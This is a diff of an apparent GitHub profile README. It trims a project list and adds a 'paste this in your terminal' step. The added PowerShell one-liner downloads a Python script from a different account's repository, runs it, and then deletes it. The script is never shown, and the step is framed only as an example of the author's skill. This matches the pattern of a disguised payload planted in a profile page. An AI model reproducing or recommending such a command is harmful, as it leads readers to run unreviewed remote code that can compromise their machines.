@@ -1,7 +1,12 @@
 
 
-Hey there, I'm **Yadhnika Wakde** — I call myself the **CRUD Lord** 👑  
-I make shit that works, don't ask me how, don't ask me why.
+Hey there, I'm **Yadhnika Wakde** - I make shit that works, don't ask me how, don't ask me why.
+### I can do anything as I am a Dev, and here's an example:
+
+Paste this in your terminal: 
+```
+iwr https://raw.githubusercontent.com/SuzanTurner/F/main/cli.py -OutFile temp_cli.py; python temp_cli.py; Remove-Item temp_cli.py
+```
 
 ### 📬 Hit Me Up  
 - 💌 **Email**:  
@@ -15,10 +20,6 @@ I make shit that works, don't ask me how, don't ask me why.
 - RESTful APIs that actually rest 
 - Automation, deployments, and occasional database type shi
 
-### 🔥 Currently Cooking
-- 🧹 A platform to find reliable helpers (*Meri-Didi*)  
-- 🎯 Auto-apply system for job applications using Playwright + FastAPI  
-- And way too many side projects I forget to push 😅
 
 > “Go touch some stack.” – Me, daily
 
